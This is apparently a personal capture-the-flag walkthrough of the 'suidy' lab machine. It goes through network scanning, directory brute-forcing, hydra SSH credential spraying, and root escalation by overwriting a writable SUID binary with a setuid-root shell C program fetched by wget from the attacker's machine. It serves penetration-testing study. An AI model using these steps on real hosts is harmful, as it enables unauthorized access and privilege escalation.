@@ -1,0 +1,552 @@
+			ENUMERATION
+			
+
+---ifconfig---
+
+┌──(root㉿kali)-[/home/okina]
+└─# ifconfig
+eth0: flags=4163<UP,BROADCAST,RUNNING,MULTICAST>  mtu 1500
+        inet 10.0.2.15  netmask 255.255.255.0  broadcast 10.0.2.255
+        inet6 fe80::a00:27ff:fef6:e3c3  prefixlen 64  scopeid 0x20<link>
+        ether 08:00:27:f6:e3:c3  txqueuelen 1000  (Ethernet)
+        RX packets 5  bytes 1278 (1.2 KiB)
+        RX errors 0  dropped 0  overruns 0  frame 0
+        TX packets 51  bytes 5771 (5.6 KiB)
+        TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0
+
+lo: flags=73<UP,LOOPBACK,RUNNING>  mtu 65536
+        inet 127.0.0.1  netmask 255.0.0.0
+        inet6 ::1  prefixlen 128  scopeid 0x10<host>
+        loop  txqueuelen 1000  (Local Loopback)
+        RX packets 24  bytes 1440 (1.4 KiB)
+        RX errors 0  dropped 0  overruns 0  frame 0
+        TX packets 24  bytes 1440 (1.4 KiB)
+        TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0
+
+
+
+
+---netdiscover---
+                                                                                
+┌──(root㉿kali)-[/home/okina]
+└─# netdiscover -i eth0 -r 10.0.2.0/24 -c 200
+
+ Currently scanning: 10.0.2.0/24   |   Screen View: Unique Hosts               
+                                                                               
+ 16 Captured ARP Req/Rep packets, from 4 hosts.   Total size: 960              
+ _____________________________________________________________________________
+   IP            At MAC Address     Count     Len  MAC Vendor / Hostname      
+ -----------------------------------------------------------------------------
+ 10.0.2.1        52:54:00:12:35:00      4     240  Unknown vendor              
+ 10.0.2.2        52:54:00:12:35:00      4     240  Unknown vendor              
+ 10.0.2.3        08:00:27:ba:58:78      4     240  PCS Systemtechnik GmbH      
+ 10.0.2.51       08:00:27:13:e0:49      4     240  PCS Systemtechnik GmbH      
+
+zsh: suspended  netdiscover -i eth0 -r 10.0.2.0/24 -c 200
+                                                  
+
+
+
+---nmap on our target---
+
+┌──(root㉿kali)-[/home/okina]
+└─# nmap 10.0.2.51 -sS -sC -sV -A -T4 -p-    
+Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-05-06 14:25 +03
+Nmap scan report for 10.0.2.51
+Host is up (0.00082s latency).
+Not shown: 65533 closed tcp ports (reset)
+PORT   STATE SERVICE VERSION
+22/tcp open  ssh     OpenSSH 7.9p1 Debian 10+deb10u2 (protocol 2.0)
+| ssh-hostkey: 
+|   2048 8a:cb:7e:8a:72:82:84:9a:11:43:61:15:c1:e6:32:0b (RSA)
+|   256 7a:0e:b6:dd:8f:ee:a7:70:d9:b1:b5:6e:44:8f:c0:49 (ECDSA)
+|_  256 80:18:e6:c7:01:0e:c6:6d:7d:f4:d2:9f:c9:d0:6f:4c (ED25519)
+80/tcp open  http    nginx 1.14.2
+|_http-server-header: nginx/1.14.2
+|_http-title: Site doesn't have a title (text/html).
+MAC Address: 08:00:27:13:E0:49 (Oracle VirtualBox virtual NIC)
+Device type: general purpose
+Running: Linux 4.X|5.X
+OS CPE: cpe:/o:linux:linux_kernel:4 cpe:/o:linux:linux_kernel:5
+OS details: Linux 4.15 - 5.8
+Network Distance: 1 hop
+Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
+
+TRACEROUTE
+HOP RTT     ADDRESS
+1   0.82 ms 10.0.2.51
+
+OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+Nmap done: 1 IP address (1 host up) scanned in 43.53 seconds
+                            
+
+
+
+---visiting the website didn't show much, let's run a dirb scan---
+
+
+┌──(root㉿kali)-[/home/okina]
+└─# dirb http://10.0.2.51
+
+-----------------
+DIRB v2.22    
+By The Dark Raver
+-----------------
+
+START_TIME: Mon May  6 14:28:19 2024
+URL_BASE: http://10.0.2.51/
+WORDLIST_FILES: /usr/share/dirb/wordlists/common.txt
+
+-----------------
+
+GENERATED WORDS: 4612                                                          
+
+---- Scanning URL: http://10.0.2.51/ ----
++ http://10.0.2.51/index.html (CODE:200|SIZE:22)                               
++ http://10.0.2.51/robots.txt (CODE:200|SIZE:362)                              
+                                                                               
+-----------------
+END_TIME: Mon May  6 14:28:26 2024
+DOWNLOADED: 4612 - FOUND: 2
+             
+
+
+---visited the http://10.0.2.51/robots.txt and inspected the source code, discovered the page /shehatesme/,
+let's visit http://10.0.2.51/shehatesme/---
+
+
+
+---We find a note that says "She hates me because I FOUND THE REAL SECRET! I put in this directory a 
+lot of .txt files. ONE of .txt files contains credentials like "theuser/thepass" to access to her system! All 
+that you need is an small dict from Seclist!". Let's run a gobuster scan to discover the .txt files--- 
+
+
+
+---To be fair though, this message has a username and password: theuser thepass :)---
+
+
+┌──(root㉿kali)-[/home/okina]
+└─# gobuster dir -u http://10.0.2.51/shehatesme/ -w /usr/share/dirbuster/wordlists/directory-list-2.3-medium.txt -x php,html,css,png,txt,jpg,jpeg 
+===============================================================
+Gobuster v3.6
+by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
+===============================================================
+[+] Url:                     http://10.0.2.51/shehatesme/
+[+] Method:                  GET
+[+] Threads:                 10
+[+] Wordlist:                /usr/share/dirbuster/wordlists/directory-list-2.3-medium.txt
+[+] Negative Status codes:   404
+[+] User Agent:              gobuster/3.6
+[+] Extensions:              html,css,png,txt,jpg,jpeg,php
+[+] Timeout:                 10s
+===============================================================
+Starting gobuster in directory enumeration mode
+===============================================================
+/index.html           (Status: 200) [Size: 229]
+/full.txt             (Status: 200) [Size: 16]
+/about.txt            (Status: 200) [Size: 16]
+/search.txt           (Status: 200) [Size: 16]
+/privacy.txt          (Status: 200) [Size: 16]
+/blog.txt             (Status: 200) [Size: 16]
+/new.txt              (Status: 200) [Size: 16]
+/page.txt             (Status: 200) [Size: 16]
+/forums.txt           (Status: 200) [Size: 16]
+/jobs.txt             (Status: 200) [Size: 16]
+/other.txt            (Status: 200) [Size: 16]
+/admin.txt            (Status: 200) [Size: 16]
+/welcome.txt          (Status: 200) [Size: 16]
+/faqs.txt             (Status: 200) [Size: 16]
+/2001.txt             (Status: 200) [Size: 16]
+/link.txt             (Status: 200) [Size: 16]
+/space.txt            (Status: 200) [Size: 16]
+/network.txt          (Status: 200) [Size: 16]
+/google.txt           (Status: 200) [Size: 16]
+/folder.txt           (Status: 200) [Size: 16]
+/java.txt             (Status: 200) [Size: 16]
+/issues.txt           (Status: 200) [Size: 16]
+/guide.txt            (Status: 200) [Size: 16]
+/es.txt               (Status: 200) [Size: 16]
+/art.txt              (Status: 200) [Size: 16]
+/smilies.txt          (Status: 200) [Size: 16]
+/airport.txt          (Status: 200) [Size: 16]
+/secret.txt           (Status: 200) [Size: 16]
+/procps.txt           (Status: 200) [Size: 16]
+/pynfo.txt            (Status: 200) [Size: 16]
+/lh2.txt              (Status: 200) [Size: 16]
+/muze.txt             (Status: 200) [Size: 16]
+/alba.txt             (Status: 200) [Size: 16]
+/cymru.txt            (Status: 200) [Size: 16]
+/wha.txt              (Status: 200) [Size: 16]
+Progress: 1764480 / 1764488 (100.00%)
+===============================================================
+Finished
+===============================================================
+                                   
+
+---in each file there is a possible theuser/thepass crendential duo. We can try them one by one but we can 
+also use a python script to automize this process---
+
+
+---I got all the subdomain names and put them in a file named file.txt--- 
+
+
+┌──(root㉿kali)-[/home/okina/Desktop/NOTLAR/SUIDY LINUX CTF]
+└─# cat files.txt 
+full
+about
+search
+privacy
+blog
+new
+page
+.
+.
+.
+
+
+
+---you get the idea, now we will write a script to get the subdomain names from file.txt and curl every one 
+of them, get the content of each page and discard the values that repeats themselves and write them into a 
+file named credentials.txt---
+
+
+
+┌──(root㉿kali)-[/home/okina/Desktop/NOTLAR/SUIDY LINUX CTF]
+└─# cat list.py  
+while IFS="" read -r line || [ -n "$line" ]
+do
+  curl -s http://10.0.2.51/shehatesme/"$line".txt
+done < files.txt | sort -u > credentials.txt
+
+
+IFS="": sets the IFS (internal field seperator) to empty, ensures that leading and trailing whitespaces
+are preserved
+
+read -r line: reads a line from the input list.txt and writes it into the variable line
+
+-s: curl command gives out the output of each trial and it looks messy, -s or --silent parameter suppresses the
+progress meter
+
+
+
+┌──(root㉿kali)-[/home/okina/Desktop/NOTLAR/SUIDY LINUX CTF]
+└─# cat credentials.txt 
+hidden1/passZZ!
+jaime11/JKiufg6
+jhfbvgt/iugbnvh
+john765/FDrhguy
+maria11/jhfgyRf
+mmnnbbv/iughtyr
+nhvjguy/kjhgyut
+smileys/98GHbjh
+theuser/thepass
+yuijhse/hjupnkk
+
+
+
+---To automize this even further, instead of trying one by one we can convert the "/" sign into ":" so that
+when we try to crack with hydra we can just insert one file---
+
+
+
+┌──(root㉿kali)-[/home/okina/Desktop/NOTLAR/SUIDY LINUX CTF]
+└─# sed -i 's/\//:/g' credentials.txt
+                                     
+
+sed: Text stream processing, used to filter or transform text
+
+-i: this option tells sed to edit the file
+
+'s/\//:/g': Substitution command in sed. Searches for the "/" character and replaces it with ":" character.
+The "g" at the end means to perform the replacement globally, for every line in every case. 
+
+                                           
+┌──(root㉿kali)-[/home/okina/Desktop/NOTLAR/SUIDY LINUX CTF]
+└─# cat credentials.txt              
+hidden1:passZZ!
+jaime11:JKiufg6
+jhfbvgt:iugbnvh
+john765:FDrhguy
+maria11:jhfgyRf
+mmnnbbv:iughtyr
+nhvjguy:kjhgyut
+smileys:98GHbjh
+theuser:thepass
+yuijhse:hjupnkk
+
+
+
+
+---let's use hydra to find the correct credentials. The -C parameter makes so that the credentials can be written
+in a colon seperated (username:password) way instead of using -L/-P options---
+
+
+
+┌──(root㉿kali)-[/home/okina/Desktop/NOTLAR/SUIDY LINUX CTF]
+└─# hydra -C credentials.txt 10.0.2.51 ssh                   
+Hydra v9.5 (c) 2023 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).
+
+Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2024-05-06 16:24:01
+
+[22][ssh] host: 10.0.2.51   login: theuser   password: thepass
+
+1 of 1 target successfully completed, 1 valid password found
+
+
+
+---found them---
+
+
+
+			GAINING FOOTHOLD
+
+			
+┌──(root㉿kali)-[/home/okina]
+└─# ssh theuser@10.0.2.51
+theuser@10.0.2.51's password: 
+Linux suidy 4.19.0-9-amd64 #1 SMP Debian 4.19.118-2+deb10u1 (2020-06-07) x86_64
+
+The programs included with the Debian GNU/Linux system are free software;
+the exact distribution terms for each program are described in the
+individual files in /usr/share/doc/*/copyright.
+
+Debian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent
+permitted by applicable law.
+Last login: Sun May  5 23:53:48 2024 from 10.0.2.15
+theuser@suidy:~$ ls
+user.txt
+theuser@suidy:~$ cat user.txt 
+
+---First User Flag---
+
+
+
+
+---Lets look for some clues now---
+
+
+
+---In the home folder there is a directory named suidy---		
+
+
+theuser@suidy:/home/suidy$ ls
+note.txt  suidyyyyy
+theuser@suidy:/home/suidy$ ls -la
+total 52
+drwxr-xr-x 3 suidy suidy    4096 may  6 00:49 .
+drwxr-xr-x 4 root  root     4096 sep 26  2020 ..
+-rw------- 1 suidy suidy      12 sep 27  2020 .bash_history
+-rw-r--r-- 1 suidy suidy     220 sep 26  2020 .bash_logout
+-rw-r--r-- 1 suidy suidy    3526 sep 26  2020 .bashrc
+drwxr-xr-x 3 suidy suidy    4096 sep 26  2020 .local
+-r--r----- 1 suidy suidy     197 sep 26  2020 note.txt
+-rw-r--r-- 1 suidy suidy     807 sep 26  2020 .profile
+-rwsrwsr-x 1 root  theuser 16704 sep 26  2020 suidyyyyy
+theuser@suidy:/home/suidy$ cat note.txt 
+cat: note.txt: Permiso denegado
+
+
+
+
+---when we did ls -la we see that suidyyyy executable file has rwsrwsr-x permissions, this means the user and
+user group have read, write, execute and setuid permissions. As you know setuid bit means that whoever runs
+the file gains access rights of the owner of the file---
+
+
+---I thought of changing the content of the file but let's do some more ---
+
+
+
+
+---let's execute the binary suidyyyyy script---
+
+
+theuser@suidy:/home/suidy$ ./suidyyyyy 
+suidy@suidy:/home/suidy$ cat note.txt 
+I love SUID files!
+The best file is suidyyyyy because users can use it to feel as I feel.
+root know it and run an script to be sure that my file has SUID. 
+If you are "theuser" I hate you!
+
+-suidy
+
+
+---we see that when we run the suidyyyy binary file that gives us the shell of the user suidy. 
+Now we have the permission to read the note.txt---
+	 
+
+
+---okay, this note means that root might execute a script here. we can utilize pspy64 tool---
+
+
+
+Pspy64: A tool to snoop on processes without the need for root permissions.
+
+Link -> https://github.com/DominicBreuker/pspy?tab=readme-ov-file
+
+
+
+
+---as suidy user we can't execute pspy64 so I change user and directories. I start my python server from
+my main machine so that it can be uploaded---
+
+			
+
+suidy@suidy:/home/suidy$ su theuser
+Contraseña: 
+theuser@suidy:/home/suidy$ cd ..
+theuser@suidy:/home$ ls
+suidy  theuser
+theuser@suidy:/home$ cd theuser/
+theuser@suidy:~$ wget http://10.0.2.15:5050/pspy64
+--2024-05-06 16:30:21--  http://10.0.2.15:5050/pspy64
+Conectando con 10.0.2.15:5050... conectado.
+Petición HTTP enviada, esperando respuesta... 200 OK
+Longitud: 3104768 (3,0M) [application/octet-stream]
+Grabando a: “pspy64”
+
+pspy64                   100%[================================>]   2,96M  --.-KB/s    en 0,07s   
+
+2024-05-06 16:30:21 (43,1 MB/s) - “pspy64” guardado [3104768/3104768]
+
+theuser@suidy:~$ ls
+pspy64  user.txt
+theuser@suidy:~$ chmod +x *
+
+
+
+---let's run it---
+
+
+theuser@suidy:~$ ./pspy64
+pspy - version: v1.2.1 - Commit SHA: f9e6a1590a4312b9faa093d8dc84e19567977a6d
+
+
+     ██▓███    ██████  ██▓███ ▓██   ██▓
+    ▓██░  ██▒▒██    ▒ ▓██░  ██▒▒██  ██▒
+    ▓██░ ██▓▒░ ▓██▄   ▓██░ ██▓▒ ▒██ ██░
+    ▒██▄█▓▒ ▒  ▒   ██▒▒██▄█▓▒ ▒ ░ ▐██▓░
+    ▒██▒ ░  ░▒██████▒▒▒██▒ ░  ░ ░ ██▒▓░
+    ▒▓▒░ ░  ░▒ ▒▓▒ ▒ ░▒▓▒░ ░  ░  ██▒▒▒ 
+    ░▒ ░     ░ ░▒  ░ ░░▒ ░     ▓██ ░▒░ 
+    ░░       ░  ░  ░  ░░       ▒ ▒ ░░  
+                   ░           ░ ░     
+                               ░ ░     
+
+Config: Printing events (colored=true): processes=true | file-system-events=false ||| Scanning for processes every 100ms and on inotify events ||| Watching directories: [/usr /tmp /etc /home /var /opt] (recursive) | [] (non-recursive)
+Draining file system events due to startup...
+done
+2024/05/06 16:31:09 CMD: UID=1000  PID=13549  | ./pspy64 
+2024/05/06 16:31:09 CMD: UID=0     PID=13542  | 
+2024/05/06 16:31:09 CMD: UID=1000  PID=13532  | bash
+.
+.
+.
+.
+
+2024/05/06 16:33:01 CMD: UID=0     PID=13562  | /bin/sh -c sh /root/timer.sh 
+2024/05/06 16:33:01 CMD: UID=0     PID=13563  | sh /root/timer.sh 
+.
+.
+.
+.
+
+
+
+---In one of the processes we see a script called /root/timer.sh that runs automatically. We can assume that
+suidyyyy binary is also bein run automatically on a time period so if we manage to change the content of the 
+file according to what we want to achieve and then run it after waiting some time, we might escalate our 
+privileges---
+
+
+
+
+			
+			PRIVILEGE ESCALATION
+
+
+---To change permissions we need to reassign UID (user id) and GID (group id) values to that of the root
+user's. We can use a C code for that, write it within the suidyyy file and then gain root access, remember
+tho, we should do it as the theuser user---
+
+
+---I find a C code to perform the tasks mentioned above---
+
+
+
+┌──(root㉿kali)-[/home/okina]
+└─# nano suidy.c      
+                                                                                                  
+┌──(root㉿kali)-[/home/okina]
+└─# cat suidy.c 
+#include <stdlib.h>
+#include <unistd.h>
+
+int main()
+{
+   setuid(0);
+   setgid(0);
+   system("/bin/bash");
+   return 0;
+}
+    
+
+
+---my python server is up and running, let's download it into the shell---
+
+
+theuser@suidy:/tmp$ wget http://10.0.2.15:5050/suidy.c
+--2024-05-06 17:07:13--  http://10.0.2.15:5050/suidy.c
+Conectando con 10.0.2.15:5050... conectado.
+Petición HTTP enviada, esperando respuesta... 200 OK
+Longitud: 121 [text/x-csrc]
+Grabando a: “suidy.c”
+
+suidy.c                  100%[================================>]     121  --.-KB/s    en 0s      
+
+2024-05-06 17:07:13 (30,0 MB/s) - “suidy.c” guardado [121/121]
+
+theuser@suidy:/tmp$ ls
+linpeas.sh  systemd-private-ee6ad7ccb2624570a3231a64e52bb88c-systemd-timesyncd.service-IPFMA7
+suidy.c
+
+
+theuser@suidy:/tmp$ gcc suidy.c -o suidyyyyy
+
+---rename the file---
+
+theuser@suidy:/tmp$ ls
+suidy.c
+suidyyyyy
+
+theuser@suidy:/tmp$ cp suidyyyyy /home/suidy/suidyyyyy 
+
+
+---copy the C code into the suidyyyyy suid---
+
+
+---wait a little bit and then go run the script---
+
+
+
+theuser@suidy:/tmp$ cd /home/suidy/
+
+theuser@suidy:/home/suidy$ ./suidyyyyy 
+root@suidy:/home/suidy# 
+
+
+---Boom, we are root---
+
+
+root@suidy:/home/suidy# cd /root
+root@suidy:/root# ls
+root.txt  timer.sh
+root@suidy:/root# cat root.txt 
+
+---Root User Flag---
+
+
+
+
+
+
